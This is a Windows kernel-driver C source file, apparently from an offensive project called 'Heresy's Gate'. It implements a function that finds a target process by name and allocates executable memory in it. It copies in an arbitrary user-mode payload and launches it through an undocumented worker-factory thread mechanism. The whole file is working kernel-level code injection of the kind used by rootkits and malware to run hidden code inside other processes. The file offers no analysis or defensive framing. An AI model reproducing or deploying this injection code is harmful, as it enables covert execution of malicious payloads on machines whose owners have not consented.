//###########################
//#		HERSESY'S GATE		#
//###########################
//RAW COPY-PASTED!
//—€–Œ≈  Œœ»–Œ¬¿Õ»≈ “≈’Õ» »

#include <ntifs.h>
#include <ntddk.h>

#include "common.h"

#ifdef ALLOC_PRAGMA
#pragma alloc_text( PAGE, InjectWorkFactory )
#endif

NTSTATUS NTAPI InjectWorkFactory(
	_In_ PCHAR ProcessInsensitiveName,
	_In_ PUCHAR UserModePayload,
	_In_ SIZE_T UserModePayloadSize,
	_In_ ULONG PoolTag
)
{
	NTSTATUS Status = STATUS_NOT_FOUND;

	PKAPC_STATE ApcState = ExAllocatePoolWithTag(NonPagedPool, sizeof(KAPC_STATE), PoolTag);
	if (ApcState == NULL)
		return STATUS_INSUFFICIENT_RESOURCES;

	for (ULONG ProcessId = 4; ProcessId < 0xffff; ProcessId += 4)
	{
		PEPROCESS Process = NULL;
		
		if (!NT_SUCCESS(Status = PsLookupProcessByProcessId((HANDLE)ProcessId, &Process)))
			continue;


		if (_stricmp(ProcessInsensitiveName, __PsGetProcessImageFileName(Process)) != 0)
		{
			ObDereferenceObject(Process);
			continue;
		}

		Status = STATUS_SUCCESS;
		
		KeStackAttachProcess((PRKPROCESS)Process, ApcState);


		do {
			HANDLE ProcessHandle = (HANDLE)-1;

			PVOID UserAddress = NULL;
			DbgPrint("ALLOC PAGE SIZE 0x%x\n", UserModePayloadSize);
			
			if (!NT_SUCCESS(Status = ZwAllocateVirtualMemory(ProcessHandle, &UserAddress, 0, &UserModePayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)))
				break;

			DbgPrint("COPYING PAYLOAD at 0x%llx!\n", UserAddress);
			memcpy(UserAddress, UserModePayload, UserModePayloadSize);

			HANDLE IoCompletionHandle = NULL;
			ACCESS_MASK IoCompletionAllAccess = STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0x3;
			
			if (!NT_SUCCESS(Status = __ZwCreateIoCompletion(&IoCompletionHandle, IoCompletionAllAccess, NULL, 1)))
				break;

			HANDLE WorkerFactoryHandle = NULL;
			ACCESS_MASK WorkerAccess = 0xF00FF;

			Status = __ZwCreateWorkerFactory(
				&WorkerFactoryHandle,
				WorkerAccess,
				NULL,
				IoCompletionHandle,
				ProcessHandle,
				UserAddress,
				NULL,
				1,
				32768,
				32768
			);

			if (!NT_SUCCESS(Status))
			{
				return Status;
			}

			UINT32 MinimumThreads = 1;
			Status = __ZwSetInformationWorkerFactory(
				WorkerFactoryHandle,
				WorkerFactoryMinimumThreadInformation,
				&MinimumThreads,
				sizeof(MinimumThreads)
			);

			if (!NT_SUCCESS(Status))
			{
				return Status;
			}
		} while (0);

		KeUnstackDetachProcess(ApcState);
		ObDereferenceObject(Process);
		break;
	}

	ExFreePoolWithTag(ApcState, PoolTag);

	return Status;
}